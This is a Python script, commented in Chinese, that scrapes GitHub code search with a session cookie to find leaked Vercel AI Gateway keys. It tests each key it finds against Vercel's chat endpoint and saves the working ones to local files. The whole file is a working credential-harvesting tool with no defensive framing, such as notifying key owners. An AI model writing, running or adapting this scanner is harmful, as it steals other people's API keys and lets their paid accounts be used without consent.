#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
专门扫描 Vercel AI Gateway 密钥的并发扫描器
支持多线程并发搜索以提高扫描速度
支持实时保存功能
现在使用 GITHUB_SESSION 进行搜索，支持正则表达式
"""

import os
import re
import time
import threading
import concurrent.futures
from queue import Queue
import requests
from datetime import datetime
import json
import random

# 加载.env文件
try:
    from dotenv import load_dotenv
    load_dotenv()
    print("✅ 已加载.env文件")
except ImportError:
    print("⚠️ 未安装python-dotenv，将使用系统环境变量")

# --- 配置 ---
GITHUB_SESSION = os.getenv('GITHUB_SESSION')

# Vercel 配置
VERCEL_BASE_URL = "https://ai-gateway.vercel.sh"
VERCEL_CHAT_URL = f"{VERCEL_BASE_URL}/v1/chat/completions"

# 测试模型配置
TEST_MODELS = [
    "alibaba/qwen-3-14b"  # 用户指定的测试模型
]

# 并发配置
MAX_WORKERS = 5  # 最大并发线程数
API_DELAY = 1.5  # API请求间隔（秒）
MAX_RESULTS_PER_QUERY = 500  # 每个查询最多检查的结果数

# 存储结果的线程安全队列
live_keys_queue = Queue()    # 存活密钥
processed_keys = set()       # 防止重复处理相同密钥
lock = threading.Lock()
file_lock = threading.Lock() # 文件写入锁

# 实时保存文件名（全局变量）
live_keys_filename = None
simple_keys_filename = None

# --- GitHub Session Search 相关函数 ---

def get_headers():
    if not GITHUB_SESSION:
        raise ValueError("Missing GITHUB_SESSION")
    return {
        "Cookie": f"user_session={GITHUB_SESSION}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }

def search_github(query, max_pages=5):
    links = set()
    print(f"📡 搜索: {query}")
    
    for page in range(1, max_pages + 1):
        try:
            url = "https://github.com/search"
            params = {'q': query, 'type': 'code', 'p': page, 'o': 'desc', 's': 'indexed'}
            
            resp = requests.get(url, headers=get_headers(), params=params, timeout=30)
            
            if resp.status_code == 429:
                print("   ⚠️ Rate Limited (429). Waiting 60s...")
                time.sleep(60)
                continue
            elif resp.status_code != 200:
                print(f"   ❌ Error {resp.status_code}")
                break
                
            # 提取链接
            page_links = re.findall(r'href="(/[^\s"\'<>]+/blob/[^\s"\'<>]+?)(?:#L\d+)?"', resp.text)
            
            if not page_links:
                break
                
            for link in page_links:
                full = "https://github.com" + link.split('#')[0]
                links.add(full)
                
            print(f"   Page {page}: found {len(page_links)} links")
            time.sleep(random.uniform(2, 4))
            
        except Exception as e:
            print(f"   Search Error: {e}")
            break
            
    return list(links)

# --- Vercel 相关函数 ---

def test_model_access(api_key, model_name):
    """测试模型访问权限"""
    try:
        # Vercel 使用Authorization Bearer头部认证
        headers = {
            "Authorization": f"Bearer {api_key}",
            "Content-Type": "application/json"
        }
        
        payload = {
            "model": model_name,
            "messages": [
                {"role": "user", "content": "Hello"}
            ],
            "max_tokens": 1,
            "temperature": 0.1
        }
        
        response = requests.post(VERCEL_CHAT_URL, 
                               headers=headers, 
                               json=payload, 
                               timeout=15)
        
        if response.status_code == 200:
            return {"success": True, "model": model_name, "response": response.json()}
        else:
            return {"success": False, "error": f"HTTP {response.status_code}: {response.text}", "model": model_name}
            
    except Exception as e:
        return {"success": False, "error": str(e), "model": model_name}

def save_live_key_immediately(key_info):
    """实时保存存活密钥到文件"""
    global live_keys_filename, simple_keys_filename
    
    with file_lock:
        # 如果文件名还未初始化，创建文件名
        if live_keys_filename is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            live_keys_filename = f'vercel_live_keys_{timestamp}.txt'
            simple_keys_filename = f'vercel_keys_simple_{timestamp}.txt'
            
            # 创建详细文件的头部
            with open(live_keys_filename, 'w', encoding='utf-8') as f:
                f.write("=== Vercel 密钥扫描结果 (实时更新) ===\n")
                f.write(f"扫描开始时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"测试模型列表: {', '.join(TEST_MODELS)}\n")
                f.write("=" * 60 + "\n\n")
            
            # 创建简化文件的头部
            with open(simple_keys_filename, 'w', encoding='utf-8') as f:
                f.write("=== Vercel 密钥列表 (实时更新) ===\n")
                f.write(f"扫描开始时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 40 + "\n\n")
        
        # 追加详细信息到详细文件
        with open(live_keys_filename, 'a', encoding='utf-8') as f:
            f.write(f"🔑 {key_info['type']}\n")
            f.write(f"   密钥: {key_info['key']}\n")
            f.write(f"   状态: {key_info['status']}\n")
            f.write(f"   可访问模型数: {key_info['accessible_count']}/{key_info['total_test_models']}\n")
            f.write(f"   可访问模型: {', '.join(key_info['accessible_models'])}\n")
            
            if key_info['failed_models']:
                f.write(f"   失败模型:\n")
                for failed in key_info['failed_models']:
                    f.write(f"     - {failed['model']}: {failed['error'][:100]}\n")
            
            f.write(f"   仓库: {key_info['repo']}\n")
            f.write(f"   文件: {key_info['file_path']}\n")
            f.write(f"   链接: {key_info['url']}\n")
            f.write(f"   发现时间: {key_info['discovered_time']}\n")
            f.write("-" * 60 + "\n")
        
        # 追加密钥到简化文件
        with open(simple_keys_filename, 'a', encoding='utf-8') as f:
            f.write(f"{key_info['key']}\n")
        
        print(f"💾 已实时保存密钥到: {live_keys_filename}")

def check_vercel_key(key):
    """验证Vercel密钥是否有效"""
    # 简单的格式校验：vck_开头，长度通常为56+4=60
    if not key.startswith("vck_"):
        return {"status": "无效格式", "type": "invalid", "accessible_models": []}
    
    accessible_models = []
    failed_models = []
    
    # 测试指定模型
    for model in TEST_MODELS:
        result = test_model_access(key, model)
        if result["success"]:
            accessible_models.append(model)
            print(f"   ✅ 模型 {model} 可访问")
        else:
            failed_models.append({"model": model, "error": result["error"]})
            print(f"   ❌ 模型 {model} 不可访问: {result['error'][:100]}")
        
        # 添加延迟避免API限制
        time.sleep(0.5)
    
    if accessible_models:
        return {
            "status": f"🟢 密钥存活 (Live) - 可访问 {len(accessible_models)}/{len(TEST_MODELS)} 个测试模型",
            "type": "live",
            "accessible_models": accessible_models,
            "failed_models": failed_models
        }
    else:
        return {
            "status": f"🔴 密钥无效/已吊销 (Invalid/Revoked) - 所有测试模型均不可访问",
            "type": "invalid",
            "accessible_models": [],
            "failed_models": failed_models
        }

def process_content_file(file_url, worker_id):
    """下载并处理单个文件内容，提取并验证API密钥"""
    try:
        print(f"[Worker-{worker_id}] 正在检查: {file_url}")
        
        # 构造 Raw URL
        if "github.com" in file_url and "/blob/" in file_url:
            raw_url = file_url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
        else:
            raw_url = file_url
            
        resp = requests.get(raw_url, timeout=15)
        if resp.status_code != 200:
            return
            
        file_content = resp.text
        
        # 使用正则表达式提取vck_密钥
        pattern = r'(vck_[A-Za-z0-9]{56})'
        potential_keys = re.findall(pattern, file_content)
        
        for key in potential_keys:
            with lock:
                if key in processed_keys:
                    continue
                processed_keys.add(key)
            
            print(f"[Worker-{worker_id}] 🔍 测试密钥: {key[:20]}...")
            
            # 验证密钥
            result = check_vercel_key(key)
            print(f"[Worker-{worker_id}] 🔑 密钥状态: {result['status']}")
            
            # 如果密钥存活，立即保存并添加到队列
            if result["type"] == "live":
                repo_match = re.search(r'github\.com/([^/]+/[^/]+)', file_url)
                repo_name = repo_match.group(1) if repo_match else "unknown"

                key_info = {
                    'type': 'Vercel Key',
                    'key': key,
                    'status': result['status'],
                    'accessible_models': result['accessible_models'],
                    'failed_models': result['failed_models'],
                    'total_test_models': len(TEST_MODELS),
                    'accessible_count': len(result['accessible_models']),
                    'url': file_url,
                    'repo': repo_name,
                    'file_path': file_url,
                    'discovered_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'worker_id': worker_id
                }
                
                # 实时保存到文件
                save_live_key_immediately(key_info)
                
                # 同时添加到队列（用于最终统计）
                live_keys_queue.put(key_info)
                print(f"[Worker-{worker_id}] ✅ 已实时保存并记录存活密钥")
            
            # 添加延迟以避免API速率限制
            time.sleep(API_DELAY)
            
    except Exception as e:
        print(f"[Worker-{worker_id}] ❌ 处理文件时出错: {e}")

def concurrent_search_and_validate():
    """并发搜索和验证Vercel密钥"""
    print(f"🚀 开始并发搜索Vercel密钥 (并发数: {MAX_WORKERS})")
    print("=" * 60)
    
    # 定义搜索查询
    search_queries = [
        'token /vck_[A-Za-z0-9]{56}/',
        'key /vck_[A-Za-z0-9]{56}/',
        'vercel /vck_[A-Za-z0-9]{56}/',
        'ai-gateway.vercel.sh /vck_[A-Za-z0-9]{56}/',
        '/vck_[A-Za-z0-9]{56}/'
    ]
    
    all_file_urls = set()
    
    # 收集所有搜索结果
    for query in search_queries:
        print(f"📡 执行搜索查询: {query}")
        urls = search_github(query, max_pages=5)
        all_file_urls.update(urls)
        # 避免太过频繁
        time.sleep(2)
    
    file_list = list(all_file_urls)
    print(f"🗂️ 去重后共 {len(file_list)} 个唯一文件需要处理")
    
    # 使用线程池并发处理文件
    if file_list:
        print(f"⚡ 启动 {MAX_WORKERS} 个工作线程进行并发处理...")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            # 提交所有任务
            futures = [executor.submit(process_content_file, url, i % MAX_WORKERS + 1) for i, url in enumerate(file_list)]
            
            # 等待所有任务完成
            completed = 0
            total = len(file_list)
            for future in concurrent.futures.as_completed(futures):
                completed += 1
                try:
                    future.result()
                    print(f"📊 进度: {completed}/{total} ({(completed/total)*100:.1f}%)")
                except Exception as e:
                    print(f"❌ 任务异常: {e}")
    
    print("\n✅ 所有文件处理完成")

def save_results():
    """保存扫描结果到文件（仅在没有实时保存时使用）"""
    global live_keys_filename, simple_keys_filename
    
    live_keys = []
    
    # 从队列中获取所有结果
    while not live_keys_queue.empty():
        live_keys.append(live_keys_queue.get())
    
    # 如果已经有实时保存的文件，只需要更新统计信息
    if live_keys_filename is not None and live_keys:
        with file_lock:
            # 在实时保存文件末尾添加扫描完成统计
            with open(live_keys_filename, 'a', encoding='utf-8') as f:
                f.write("\n" + "=" * 60 + "\n")
                f.write("=== 扫描完成统计 ===\n")
                f.write(f"扫描结束时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"总计发现存活密钥数量: {len(live_keys)}\n")
                f.write(f"处理的唯一密钥总数: {len(processed_keys)}\n")
                f.write("=" * 60 + "\n")
            
            # 在简化文件末尾添加统计
            with open(simple_keys_filename, 'a', encoding='utf-8') as f:
                f.write(f"\n# 扫描完成时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# 总计: {len(live_keys)} 个存活密钥\n")
        
        print(f"📊 已更新实时保存文件的扫描统计: {live_keys_filename}")
        print(f"📊 总计发现 {len(live_keys)} 个存活密钥")
        
    # 如果没有实时保存（即没有发现存活密钥），创建传统的结果文件
    elif not live_keys_filename and live_keys:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f'vercel_live_keys_{timestamp}.txt'
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("=== Vercel 密钥扫描结果 ===\n")
            f.write(f"扫描时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"发现存活密钥数量: {len(live_keys)}\n")
            f.write(f"测试模型列表: {', '.join(TEST_MODELS)}\n")
            f.write("=" * 60 + "\n\n")
            
            for i, key_info in enumerate(live_keys, 1):
                f.write(f"{i}. {key_info['type']}\n")
                f.write(f"   密钥: {key_info['key']}\n")
                f.write(f"   状态: {key_info['status']}\n")
                f.write(f"   可访问模型数: {key_info['accessible_count']}/{key_info['total_test_models']}\n")
                f.write(f"   可访问模型: {', '.join(key_info['accessible_models'])}\n")
                
                if key_info['failed_models']:
                    f.write(f"   失败模型:\n")
                    for failed in key_info['failed_models']:
                        f.write(f"     - {failed['model']}: {failed['error'][:100]}\n")
                
                f.write(f"   仓库: {key_info['repo']}\n")
                f.write(f"   文件: {key_info['file_path']}\n")
                f.write(f"   链接: {key_info['url']}\n")
                f.write(f"   发现时间: {key_info['discovered_time']}\n")
                f.write("-" * 60 + "\n")
        
        print(f"💾 已将 {len(live_keys)} 个存活密钥保存到: {filename}")
        
        # 保存简化版本（仅密钥）
        simple_filename = f'vercel_keys_simple_{timestamp}.txt'
        with open(simple_filename, 'w', encoding='utf-8') as f:
            f.write("=== Vercel 密钥列表 ===\n")
            f.write(f"扫描时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"总计: {len(live_keys)} 个存活密钥\n")
            f.write("=" * 40 + "\n\n")
            
            for key_info in live_keys:
                f.write(f"{key_info['key']}\n")
        
        print(f"📝 已将密钥列表保存到: {simple_filename}")
    
    # 如果没有发现任何存活密钥
    if not live_keys:
        print("\n📝 未发现存活的 Vercel 密钥")

def main():
    """主函数"""
    if not GITHUB_SESSION:
        print("❌ 错误: 请在 .env 文件中设置 GITHUB_SESSION 以使用 Session 搜索模式")
        return

    print("🔍 Vercel 密钥并发扫描器 (Session Search Mode)")
    print("=" * 50)
    print(f"⚙️ 配置:")
    print(f"   - 最大并发线程数: {MAX_WORKERS}")
    print(f"   - API请求延迟: {API_DELAY}秒")
    print(f"   - 每个查询最大结果数: {MAX_RESULTS_PER_QUERY}")
    print(f"   - 测试模型: {', '.join(TEST_MODELS)}")
    print("=" * 50)
    
    start_time = time.time()
    
    try:
        print("\n🚀 开始扫描...")
        
        # 执行并发搜索和验证
        concurrent_search_and_validate()
        
        # 保存结果
        save_results()
        
        end_time = time.time()
        elapsed_time = end_time - start_time
        
        print(f"\n🏁 扫描完成!")
        print(f"⏱️ 总耗时: {elapsed_time:.2f}秒")
        print(f"🔧 处理的唯一密钥数: {len(processed_keys)}")
        print(f"✅ 发现存活密钥数: {live_keys_queue.qsize()}")
        
    except KeyboardInterrupt:
        print("\n🛑 用户中断扫描")
        save_results()  # 保存已找到的结果
    except Exception as e:
        print(f"\n❌ 扫描过程中发生错误: {e}")
        save_results()  # 保存已找到的结果

if __name__ == '__main__':
    main()
